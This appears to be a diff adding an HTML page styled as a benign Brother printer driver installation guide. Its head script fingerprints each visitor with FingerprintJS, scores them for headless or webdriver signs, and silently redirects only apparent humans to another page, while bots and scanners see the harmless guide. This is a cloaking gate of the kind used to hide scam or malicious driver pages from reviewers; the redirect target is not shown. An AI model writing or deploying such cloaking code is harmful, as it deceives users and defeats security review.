@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Driver Install Guide</title>
+  <meta name="description" content="Simple instructions to download and install Brother printer drivers for Windows, macOS, and Chrome OS.">
+  <!-- Load FPJS early -->
+  <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js" defer></script>
+  <script>
+    // Configuration
+    const GATE = {
+      entryPaths: new Set(['/', '/home.html']), // Added /home.html; adjust for your paths
+      humanRedirect: '/index.html',             // send real users here
+      botScoreThreshold: 4,                     // lower score => more human
+      minConfidence: 0.3                        // FPJS confidence must be >= this
+    };
+
+    // Safe getter
+    function get(obj, path, fallback) {
+      try { return path.split('.').reduce((o,k)=>o && o[k], obj) ?? fallback; } catch { return fallback; }
+    }
+
+    // Simple bot score based on common client-side hints
+    function scoreBot(result) {
+      let score = 0;
+      const conf = get(result, 'confidence.score', 0);
+      const c = get(result, 'components', {});
+      const ua = String(get(c, 'userAgent.value', '') || navigator.userAgent || '').toLowerCase();
+      const webdriverComp = !!get(c, 'webdriver.value', false);
+      const vendor = String(get(c, 'vendor.value', '')).toLowerCase();
+      const platform = String(get(c, 'platform.value', '')).toLowerCase();
+      const pluginsVal = get(c, 'plugins.value', null);
+      const pluginsLen = Array.isArray(pluginsVal) ? pluginsVal.length : undefined;
+      const noPlugins = pluginsLen === 0;
+      const deviceMemory = get(c, 'deviceMemory.value', undefined);
+
+      if (conf < GATE.minConfidence) score += 2;                      // blocked sensors/emulation
+      if (ua.includes('headless') || ua.includes('puppeteer') || ua.includes('playwright')) score += 3; // headless hints
+      if (webdriverComp) score += 3;                                  // FPJS webdriver
+      if (navigator.webdriver) score += 3;                            // native webdriver
+      if (noPlugins) score += 1;                                      // suspicious plugin state
+      if (deviceMemory === 0) score += 1;                             // implausible memory
+      if (vendor === '' || vendor === 'unknown') score += 1;          // suspicious vendor
+      if (platform === '' || (platform === 'linux x86_64' && ua.includes('windows'))) score += 1; // bad combo
+      if (window.chrome && window.chrome.csi === undefined && ua.includes('chrome')) score += 1;  // odd chrome
+
+      console.log('Debug - Bot Score:', score, 'Confidence:', conf, 'UA snippet:', ua.substring(0, 50));
+      return { score, conf };
+    }
+
+    function onGatePath() {
+      const path = location.pathname.replace(/\/+$/, '') || '/'; // Trim trailing / for root
+      const isGate = GATE.entryPaths.has(path);
+      console.log('Debug - Current path:', path, 'Is gate?', isGate);
+      return isGate;
+    }
+
+    function runGate() {
+      if (!onGatePath()) {
+        console.log('Debug - Not on gate path, skipping.');
+        return; // never redirect from non-gate pages (prevents loops)
+      }
+
+      let pollCount = 0;
+      const maxPolls = 250; // ~5s timeout at 20ms intervals
+
+      const boot = () => {
+        pollCount++;
+        if (!window.FingerprintJS) {
+          if (pollCount < maxPolls) {
+            return setTimeout(boot, 20);
+          } else {
+            console.log('Debug - FPJS poll timeout - treating as unknown (no redirect).');
+            return;
+          }
+        }
+        console.log('Debug - FPJS loaded, getting visitor data...');
+        FingerprintJS.load()
+          .then(fp => fp.get())
+          .then(res => {
+            window.fpVisitorId = res.visitorId; // optional correlation
+            const { score, conf } = scoreBot(res);
+            const isClearlyHuman = score < GATE.botScoreThreshold && conf >= GATE.minConfidence;
+            console.log('Debug - Human check:', isClearlyHuman, '- Redirecting?', isClearlyHuman);
+
+            // Redirect only humans; bots/unknown stay here (no redirect)
+            if (isClearlyHuman) {
+              console.log('Debug - Redirecting to', GATE.humanRedirect);
+              location.replace(GATE.humanRedirect);
+            } else {
+              console.log('Debug - Staying on page (bot/unknown detected).');
+            }
+          })
+          .catch(err => {
+            console.error('Debug - FPJS error:', err);
+            // If FPJS fails/blocked, treat as unknown => no redirect
+          });
+      };
+      boot();
+    }
+
+    // Start early without blocking
+    (function init() {
+      console.log('Debug - Gate init starting...');
+      if ('requestIdleCallback' in window) {
+        requestIdleCallback(runGate, { timeout: 500 });
+      } else {
+        setTimeout(runGate, 0);
+      }
+    })();
+  </script>
+</head>
+<body>
+  <h1>How to Install Brother Printer Drivers</h1>
+  <p>Follow these simple steps to download and install the correct drivers for your printer model on Windows, macOS, or Chrome OS. Use downloads from brother-usa.com to ensure compatibility and security.</p>
+
+  <h2>Before You Start</h2>
+  <ul>
+    <li>Know your printer model number (e.g., HL-L2350DW). It's on the printer or in your documentation.</li>
+    <li>Ensure your computer is connected to the internet.</li>
+    <li>Have administrator access on your computer.</li>
+  </ul>
+
+  <h2>Step 1: Download the Driver</h2>
+  <ol>
+    <li>Go to the Brother support website: <a href="https://support.brother.com">support.brother.com</a>.</li>
+    <li>Enter your printer model number in the search box.</li>
+    <li>Select your operating system (Windows, macOS, or Chrome OS).</li>
+    <li>Click "Download" next to the full driver & software package.</li>
+    <li>Save the file to your Downloads folder.</li>
+  </ol>
+
+  <h2>Step 2: Install the Driver</h2>
+
+  <h3>For Windows</h3>
+  <ol>
+    <li>Run the downloaded .exe file (double-click it).</li>
+    <li>Follow the on-screen prompts: Accept the license agreement, choose connection type (USB or Wi-Fi).</li>
+    <li>Connect your printer when prompted (use USB cable or ensure it's on the same Wi-Fi network).</li>
+    <li>Click "Finish" once installation is complete.</li>
+    <li>Test by printing a page: Go to Settings > Devices > Printers & scanners > Select your printer > Print test page.</li>
+  </ol>
+
+  <h3>For macOS</h3>
+  <ol>
+    <li>Open the downloaded .dmg file.</li>
+    <li>Double-click the installer package inside.</li>
+    <li>Follow the prompts: Enter your admin password, select connection type.</li>
+    <li>Connect the printer (USB or Wi-Fi).</li>
+    <li>After installation, add the printer in System Preferences > Printers & Scanners > + button.</li>
+    <li>Select your Brother model and print a test page.</li>
+  </ol>
+
+  <h3>For Chrome OS</h3>
+  <ol>
+    <li>Go to Settings > Advanced > Printing > Printers.</li>
+    <li>Click "Add Printer" and follow prompts to detect your Brother printer.</li>
+    <li>If not detected, download the driver from Brother's site using Chrome's file manager.</li>
+    <li>Install via the downloaded package and restart your Chromebook.</li>
+    <li>Test print from any app.</li>
+  </ol>
+
+  <h2>Troubleshooting Tips</h2>
+  <ul>
+    <li>If the printer isn't detected, restart your computer and printer.</li>
+    <li>For Wi-Fi issues, ensure both devices are on the same network.</li>
+    <li>Update your OS before installing.</li>
+    <li>If problems persist, visit <a href="https://support.brother.com">Brother Support</a> or contact us.</li>
+  </ul>
+
+  <p>This guide ensures safe and easy installation. For model-specific help, search your model on our site. Last updated: November 13, 2025.</p>
+</body>
+</html>
